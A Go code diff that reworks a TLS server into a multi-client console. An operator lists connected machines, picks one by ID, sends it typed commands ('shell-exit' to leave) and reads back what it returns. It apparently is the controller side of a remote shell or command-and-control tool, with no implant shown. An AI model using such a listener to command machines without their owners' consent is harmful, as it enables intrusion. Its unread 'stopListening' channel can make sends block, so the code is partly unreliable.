@@ -7,119 +7,165 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"strconv"
 	"sync"
 )
 
-var (
-	clients   = make(map[int]net.Conn)
-	clientIDs = 0
-	mu        sync.Mutex
-)
-
-func handleClient(conn net.Conn, clientID int) {
-	defer conn.Close()
-
-	clientRemoteAddr := conn.RemoteAddr().(*net.TCPAddr)
-	fmt.Printf("Client %d connected: %s\n", clientID, clientRemoteAddr)
-
-	for {
-		// Read reponse length
-		var length int32
-		err := binary.Read(conn, binary.LittleEndian, &length)
-		if err != nil {
-			fmt.Printf("Client %d disconnected\n", clientID)
-			mu.Lock()
-			delete(clients, clientID)
-			mu.Unlock()
-			return
-		}
-
-		// Read responce
-		response := make([]byte, length)
-		_, err = conn.Read(response)
-		if err != nil {
-			fmt.Println("Error reading response:", err)
-			return
-		}
-
-		fmt.Printf("Client %d response:\n%s\n", clientID, string(response))
-	}
+type Client struct {
+	conn net.Conn
+	id   int
+	ip   string
 }
 
+var (
+	clients   = make(map[int]Client)
+	clientsMu sync.Mutex
+	clientIDs = 0
+	activeListener = -1
+	stopListening  = make(chan bool, 1)
+)
+
 func main() {
-	// Upload TLS cert
+	// Load TLS certificates
 	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
 	if err != nil {
 		fmt.Println("Error loading certificate:", err)
 		return
 	}
 
-	// Configure TLS server
 	config := &tls.Config{Certificates: []tls.Certificate{cert}}
-	ln, err := tls.Listen("tcp", ":8080", config)
+	listener, err := tls.Listen("tcp", ":8080", config)
 	if err != nil {
 		fmt.Println("Error starting server:", err)
 		return
 	}
-	defer ln.Close()
-	fmt.Println("TLS server listening on port 8080...")
+	defer listener.Close()
 
-	go func() {
-		for {
-			conn, err := ln.Accept()
-			if err != nil {
-				fmt.Println("Connection error:", err)
-				continue
-			}
+	fmt.Println("Server started on port 8080. Waiting for connections...")
 
-			mu.Lock()
-			clientID := clientIDs
-			clients[clientID] = conn
-			clientIDs++
-			mu.Unlock()
+	go acceptClients(listener)
+	menu()
+}
 
-			go handleClient(conn, clientID)
-		}
-	}()
-
-	scanner := bufio.NewScanner(os.Stdin)
-	var activeClient int
-
+func acceptClients(listener net.Listener) {
 	for {
-		fmt.Println("\nConnected clients:")
-		mu.Lock()
-		for id := range clients {
-			fmt.Printf("Client %d\n", id)
-		}
-		mu.Unlock()
-
-		fmt.Print("\nEnter client ID to interact with: ")
-		scanner.Scan()
-		fmt.Sscanf(scanner.Text(), "%d", &activeClient)
-
-		mu.Lock()
-		client, exists := clients[activeClient]
-		mu.Unlock()
-
-		if !exists {
-			fmt.Println("Invalid client ID.")
+		conn, err := listener.Accept()
+		if err != nil {
+			fmt.Println("Error accepting client connection:", err)
 			continue
 		}
 
-		for {
-			fmt.Printf("Enter command to send to Client %d (or type 'exit' to switch): ", activeClient)
-			scanner.Scan()
-			command := scanner.Text()
+		clientsMu.Lock()
+		clientID := clientIDs
+		clientIP := conn.RemoteAddr().String()
+		clients[clientID] = Client{conn, clientID, clientIP}
+		clientIDs++
+		clientsMu.Unlock()
 
-			if command == "exit" {
-				break
-			}
+		fmt.Printf("New client %d connected: %s\n", clientID, clientIP)
 
-			_, err := client.Write([]byte(command + "\n"))
-			if err != nil {
-				fmt.Println("Error sending command:", err)
-				break
-			}
+		// Start handling the client in a separate goroutine
+		go handleClient(conn, clientID, clientIP)
+	}
+}
+
+func menu() {
+	for {
+		clientsMu.Lock()
+		fmt.Println("Connected clients:")
+		for id, client := range clients {
+			fmt.Printf("ID: %d, IP: %s\n", id, client.ip)
 		}
+		clientsMu.Unlock()
+
+		fmt.Print("Enter client ID to interact ('q' to quit): ")
+		scanner := bufio.NewScanner(os.Stdin)
+		scanner.Scan()
+		input := scanner.Text()
+
+		if input == "q" {
+			return
+		}
+
+		id, err := strconv.Atoi(input)
+		if err == nil {
+			clientsMu.Lock()
+			_, exists := clients[id]
+			clientsMu.Unlock()
+
+			if exists {
+				if activeListener != -1 {
+					stopListening <- true
+				}
+				activeListener = id
+				listenToClient(id)
+			} else {
+				fmt.Println("Client with this ID not found.")
+			}
+		} else {
+			fmt.Println("Invalid input, please try again.")
+		}
+	}
+}
+
+func listenToClient(id int) {
+	clientsMu.Lock()
+	client, exists := clients[id]
+	clientsMu.Unlock()
+
+	if !exists {
+		fmt.Println("Client with this ID not found.")
+		return
+	}
+
+	fmt.Printf("Listening to client %d (IP: %s)\n", id, client.ip)
+
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Printf("[Client %d] Enter command ('shell-exit' to exit): ", id)
+		scanner.Scan()
+		command := scanner.Text()
+
+		if command == "shell-exit" {
+			fmt.Println("Exiting interaction mode with client.")
+			stopListening <- true
+			activeListener = -1
+			return
+		}
+
+		_, err := client.conn.Write([]byte(command + "\n"))
+		if err != nil {
+			fmt.Println("Error sending command:", err)
+			clientsMu.Lock()
+			delete(clients, id)
+			clientsMu.Unlock()
+			return
+		}
+	}
+}
+
+func handleClient(conn net.Conn, clientID int, clientIP string) {
+	defer func() {
+		conn.Close()
+		clientsMu.Lock()
+		delete(clients, clientID)
+		clientsMu.Unlock()
+		fmt.Printf("Client %d (IP: %s) disconnected and removed from list.\n", clientID, clientIP)
+	}()
+
+	for {
+		var length int32
+		err := binary.Read(conn, binary.LittleEndian, &length)
+		if err != nil {
+			return
+		}
+
+		response := make([]byte, length)
+		_, err = conn.Read(response)
+		if err != nil {
+			return
+		}
+
+		fmt.Printf("Response from client %d (IP: %s):\n%s\n", clientID, clientIP, string(response))
 	}
 }
